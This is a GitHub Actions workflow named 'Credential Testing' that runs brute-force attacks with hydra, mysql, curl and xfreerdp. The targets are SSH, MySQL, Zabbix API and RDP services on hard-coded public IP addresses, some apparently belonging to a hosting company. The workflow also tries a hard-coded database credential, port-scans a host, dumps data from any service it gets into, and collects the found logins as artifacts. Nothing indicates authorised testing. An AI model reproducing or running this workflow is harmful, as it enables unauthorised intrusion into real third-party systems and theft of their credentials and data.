name: Credential Testing
"on":
  workflow_dispatch:

jobs:
  ssh-brute:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        target:
          - "5.161.125.229"
          - "49.12.41.9"
          - "5.78.127.58"
          - "5.78.153.212"
        user: [root, admin, hyonix, ubuntu, debian, test, deploy, www-data]
    steps:
      - uses: actions/checkout@v4
      - name: SSH Brute Force
        run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq sshpass hydra 2>&1 | tail -1
          echo "=== SSH ${{ matrix.user }}@${{ matrix.target }} ==="
          hydra -l ${{ matrix.user }} -P passwords.txt -t 4 -V -f -o /tmp/ssh_result.txt -I ssh://${{ matrix.target }} 2>&1 | tail -5
          if [ -s /tmp/ssh_result.txt ]; then
            echo "=== FOUND ==="
            cat /tmp/ssh_result.txt
          fi
      - uses: actions/upload-artifact@v4
        with:
          name: ssh-${{ matrix.target }}-${{ matrix.user }}
          path: /tmp/ssh_result.txt
          if-no-files-found: ignore

  mysql-brute:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        target:
          - "162.55.177.241"
          - "5.78.153.212"
          - "207.148.18.120"
    steps:
      - uses: actions/checkout@v4
      - name: MySQL Brute Force
        run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq mysql-client hydra 2>&1 | tail -1
          echo "=== MySQL ${{ matrix.target }} ==="
          echo "Runner IP: $(curl -s ifconfig.me)"
          timeout 3 bash -c "echo >/dev/tcp/${{ matrix.target }}/3306" 2>/dev/null && echo "PORT 3306 OPEN" || echo "PORT 3306 CLOSED"
          while IFS= read -r line; do
            user=$(echo "$line" | cut -d: -f1)
            pass=$(echo "$line" | cut -d: -f2)
            result=$(timeout 3 mysql -h ${{ matrix.target }} -u "$user" -p"$pass" -e "SELECT 1;" 2>&1)
            if echo "$result" | grep -qv "ERROR 1045\|ERROR 2003\|ERROR 2002\|Can't connect"; then
              echo "FOUND: $user:$pass on ${{ matrix.target }}"
              echo "$user:$pass" >> /tmp/mysql_found.txt
              echo "$result" >> /tmp/mysql_found.txt
              # If connected dump everything
              mysql -h ${{ matrix.target }} -u "$user" -p"$pass" -e "SHOW DATABASES;" 2>&1 >> /tmp/mysql_found.txt
              mysql -h ${{ matrix.target }} -u "$user" -p"$pass" -e "SELECT user(), database(), version();" 2>&1 >> /tmp/mysql_found.txt
            fi
          done < creds_combo.txt
          if [ -s /tmp/mysql_found.txt ]; then echo "=== MYSQL CREDENTIALS ==="; cat /tmp/mysql_found.txt; fi
      - uses: actions/upload-artifact@v4
        with:
          name: mysql-${{ matrix.target }}
          path: /tmp/mysql_found.txt
          if-no-files-found: ignore

  whmcs-db-direct:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: WHMCS DB Direct
        run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq mysql-client 2>&1 | tail -1
          echo "Runner IP: $(curl -s ifconfig.me)"
          echo "=== Testing WHMCS DB at 207.148.18.120 ==="
          timeout 5 bash -c "echo >/dev/tcp/207.148.18.120/3306" 2>/dev/null && echo "PORT OPEN" || echo "PORT CLOSED"
          timeout 10 mysql -h 207.148.18.120 -u hyonix_api -p'HyonixAPI@123' hyonix_whmcs --connect-timeout=10 -e "SELECT 'CONNECTED' AS status;" 2>&1
          # Try alternate ports
          for port in 3306 3307 33060 3307; do
            timeout 3 bash -c "echo >/dev/tcp/207.148.18.120/$port" 2>/dev/null && echo "Port $port OPEN" || true
          done
          # Scan for any open port
          for port in 21 22 25 53 80 110 143 443 465 587 993 995 2222 3306 8080 8443 10000; do
            timeout 2 bash -c "echo >/dev/tcp/207.148.18.120/$port" 2>/dev/null && echo "  $port OPEN"
          done

  zabbix-api:
    runs-on: ubuntu-latest
    steps:
      - name: Zabbix Brute
        run: |
          echo "=== Zabbix 5.78.127.58 ==="
          # First unblock account by waiting
          sleep 30
          V=$(curl -sk "https://5.78.127.58/api_jsonrpc.php" -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":[],"id":1}' -H "Content-Type: application/json" 2>&1)
          echo "Version: $V"
          for user in Admin admin superadmin root; do
            while IFS= read -r pass; do
              R=$(curl -sk --connect-timeout 5 "https://5.78.127.58/api_jsonrpc.php" \
                -d "{\"jsonrpc\":\"2.0\",\"method\":\"user.login\",\"params\":{\"username\":\"$user\",\"password\":\"$pass\"},\"id\":1}" \
                -H "Content-Type: application/json" 2>&1)
              if echo "$R" | grep -q "result"; then
                echo "ZABBIX LOGIN: $user:$pass"
                echo "$user:$pass" >> /tmp/zabbix.txt
                echo "$R" >> /tmp/zabbix.txt
                # Extract data with token
                TOKEN=$(echo "$R" | python3 -c "import json,sys;print(json.load(sys.stdin)['result'])" 2>/dev/null)
                if [ -n "$TOKEN" ]; then
                  curl -sk "https://5.78.127.58/api_jsonrpc.php" \
                    -d "{\"jsonrpc\":\"2.0\",\"method\":\"user.get\",\"params\":{\"output\":\"extend\"},\"auth\":\"$TOKEN\",\"id\":1}" \
                    -H "Content-Type: application/json" >> /tmp/zabbix.txt 2>&1
                  curl -sk "https://5.78.127.58/api_jsonrpc.php" \
                    -d "{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{\"output\":\"extend\",\"selectInterfaces\":\"extend\"},\"auth\":\"$TOKEN\",\"id\":1}" \
                    -H "Content-Type: application/json" >> /tmp/zabbix.txt 2>&1
                fi
                break 2
              fi
              sleep 1
            done < passwords.txt
          done
      - uses: actions/upload-artifact@v4
        with:
          name: zabbix
          path: /tmp/zabbix.txt
          if-no-files-found: ignore

  rdp-brute:
    runs-on: ubuntu-latest
    steps:
      - name: RDP Brute
        run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq freerdp2-x11 2>&1 | tail -1
          echo "=== RDP 45.87.61.101 ==="
          timeout 3 bash -c "echo >/dev/tcp/45.87.61.101/3389" && echo "RDP OPEN" || echo "RDP CLOSED"
          for user in administrator admin; do
            while IFS= read -r pass; do
              R=$(timeout 8 xfreerdp /v:45.87.61.101 /u:"$user" /p:"$pass" /cert:ignore +auth-only 2>&1)
              if echo "$R" | grep -qi "authenticated\|success\|connected"; then
                echo "RDP: $user:$pass"
                echo "$user:$pass" >> /tmp/rdp.txt
              fi
            done < passwords.txt
          done
      - uses: actions/upload-artifact@v4
        with:
          name: rdp
          path: /tmp/rdp.txt
          if-no-files-found: ignore

  cred-reuse:
    runs-on: ubuntu-latest
    needs: [ssh-brute, mysql-brute, zabbix-api, rdp-brute]
    if: always()
    steps:
      - uses: actions/download-artifact@v4
        with:
          path: /tmp/results
      - name: Aggregate and Report
        run: |
          echo "# CREDENTIAL TESTING RESULTS" > /tmp/final.md
          echo "" >> /tmp/final.md
          find /tmp/results -type f -exec echo "## {}" \; -exec cat {} \; >> /tmp/final.md 2>/dev/null
          echo "" >> /tmp/final.md
          echo "## Runner Info" >> /tmp/final.md
          echo "IP: $(curl -s ifconfig.me)" >> /tmp/final.md
          cat /tmp/final.md
      - uses: actions/upload-artifact@v4
        with:
          name: final-results
          path: /tmp/final.md
